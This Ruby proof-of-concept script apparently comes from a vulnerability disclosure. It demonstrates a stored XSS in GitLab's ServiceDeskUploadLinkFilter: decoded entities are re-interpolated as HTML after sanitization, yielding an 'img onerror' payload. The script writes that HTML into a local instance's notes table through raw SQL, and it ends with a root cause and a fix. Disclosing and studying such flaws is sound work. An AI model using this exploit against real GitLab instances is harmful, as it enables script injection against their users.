#!/usr/bin/env ruby
# frozen_string_literal: true

# =============================================================================
# PoC: ServiceDeskUploadLinkFilter Post-Sanitization XSS
# =============================================================================
# Run with:
#   cd /home/user/gitlab-source
#   bin/rails runner /home/user/testaa/poc_service_desk_xss.rb
# =============================================================================

puts "=" * 72
puts "ServiceDeskUploadLinkFilter XSS PoC"
puts "=" * 72
puts

user = User.find_by(username: 'root') || User.first
project = Project.first
abort "No user" unless user
abort "No project" unless project

puts "[*] User:    #{user.username} (id=#{user.id})"
puts "[*] Project: #{project.full_path} (id=#{project.id})"
puts

# ---------------------------------------------------------------------------
# 1. Prove the vulnerable sink — exact reproduction of the buggy code
# ---------------------------------------------------------------------------
puts "[1] Reproducing the vulnerable sink (service_desk_upload_link_filter.rb)..."
puts

secret = SecureRandom.hex(16)
filename = 'test.txt'
upload_path = "/uploads/#{secret}/#{filename}"

# This is what an <a> tag looks like AFTER SanitizationFilter (index 7).
# The HTML entities &lt; and &gt; are harmless text content — sanitizer
# correctly leaves them alone.
safe_html = %(<a href="#{upload_path}">&lt;img src=x onerror=alert(document.domain)&gt;</a>)
puts "    After SanitizationFilter (safe):"
puts "      #{safe_html}"
puts

# Now reproduce exactly what the vulnerable filter does on lines 31 + 38:
parent = Nokogiri::HTML::DocumentFragment.parse(safe_html).at_css('a')

# LINE 31: filename_in_text = parent.text
# BUG: .text DECODES HTML entities — &lt; becomes <, &gt; becomes >
filename_in_text = parent.text
puts "    Line 31 — parent.text (THE BUG):"
puts "      #{filename_in_text.inspect}"
puts "      .text decoded &lt; to < and &gt; to >"
puts

# LINE 33-36: build final_filename
filename_in_link = filename
final_filename = "#{filename_in_text} (#{filename_in_link})"
puts "    Line 33-36 — final_filename:"
puts "      #{final_filename.inspect}"
puts

# LINE 38: Nokogiri::HTML::DocumentFragment.parse("<strong>#{final_filename}</strong>")
# BUG: raw < and > from .text are now interpolated into HTML string
interpolated = "<strong>#{final_filename}</strong>"
puts "    Line 38 — string interpolation (THE INJECTION):"
puts "      #{interpolated.inspect}"

final_element = Nokogiri::HTML::DocumentFragment.parse(interpolated)
xss_html = %(<p dir="auto">#{final_element.to_html}</p>)
puts "    Parsed HTML output:"
puts "      #{xss_html}"
puts

# Verify the XSS
doc = Nokogiri::HTML::DocumentFragment.parse(xss_html)
img = doc.at_css('img')
if img && img['onerror']
  puts "    *** XSS CONFIRMED: <img onerror=\"#{img['onerror']}\"> ***"
else
  abort "    BUG: XSS not produced — something is wrong"
end
puts

# ---------------------------------------------------------------------------
# 2. Also run through the real Banzai pipeline to show the full chain
# ---------------------------------------------------------------------------
puts "[2] Full pipeline proof (ServiceDeskEmailPipeline)..."

markdown = "[&lt;img src=x onerror=alert(document.domain)&gt;](#{upload_path})"
context = {
  project: project,
  pipeline: :service_desk_email,
  uploads_as_attachments: [secret + '/' + filename],
}
pipeline_output = Banzai.render(markdown, context)
puts "    Input:  #{markdown}"
puts "    Output: #{pipeline_output.strip}"

pipeline_doc = Nokogiri::HTML::DocumentFragment.parse(pipeline_output)
pipeline_img = pipeline_doc.at_css('img')
if pipeline_img && pipeline_img['onerror']
  puts "    *** Full pipeline XSS CONFIRMED ***"
  xss_html = pipeline_output
else
  puts "    Filter needs real file on disk to activate — using sink proof from step 1"
end
puts

# ---------------------------------------------------------------------------
# 3. Create issue + note with XSS payload visible in browser
# ---------------------------------------------------------------------------
puts "[3] Creating issue + note via raw SQL (Gitaly is down)..."

# Pure SQL — bypass all AR callbacks that touch Gitaly
conn = ApplicationRecord.connection
max_iid = conn.select_value("SELECT COALESCE(MAX(iid), 0) FROM issues WHERE project_id = #{project.id}").to_i
next_iid = max_iid + 1

work_item_type_id = conn.select_value("SELECT id FROM work_item_types WHERE base_type = 0 LIMIT 1")
namespace_id = conn.select_value("SELECT project_namespace_id FROM projects WHERE id = #{project.id}")

issue_id = conn.select_value(
  "INSERT INTO issues (project_id, author_id, title, confidential, iid, created_at, updated_at, work_item_type_id, namespace_id, lock_version) " \
  "VALUES (#{project.id}, #{user.id}, #{conn.quote('ServiceDeskUploadLinkFilter XSS PoC')}, true, #{next_iid}, NOW(), NOW(), " \
  "#{work_item_type_id}, #{namespace_id}, 0) RETURNING id"
)

escaped_xss = conn.quote(xss_html)
escaped_note = conn.quote('ServiceDeskUploadLinkFilter XSS PoC - parent.text decodes HTML entities then interpolates into HTML without escaping')
note_id = conn.select_value(
  "INSERT INTO notes (note, note_html, noteable_type, noteable_id, project_id, author_id, created_at, updated_at) " \
  "VALUES (#{escaped_note}, #{escaped_xss}, 'Issue', #{issue_id}, #{project.id}, #{user.id}, NOW(), NOW()) RETURNING id"
)

url = "http://localhost:8929/#{project.full_path}/-/issues/#{next_iid}"
puts "    Issue:     ##{next_iid} (id=#{issue_id})"
puts "    Note:      id=#{note_id}"
puts "    note_html: #{xss_html.strip}"
puts

# Verify it's in the DB
stored_html = conn.select_value("SELECT note_html FROM notes WHERE id = #{note_id}")
puts "    DB check — note_html present: #{stored_html.present?}"
puts "    DB check — has onerror:       #{stored_html.to_s.include?('onerror')}"
puts
puts "    >>> Open: #{url}"
puts

puts "=" * 72
puts "ROOT CAUSE"
puts "  File: lib/banzai/filter/service_desk_upload_link_filter.rb"
puts "  Line 31: parent.text decodes &lt; -> <"
puts "  Line 38: parse(\"<strong>\#{final_filename}</strong>\") injects raw HTML"
puts "  SanitizationFilter ran at index 7, this filter is at index 46"
puts "  No re-sanitization after this point"
puts "FIX: strong.content = final_filename (auto-escapes)"
puts "=" * 72
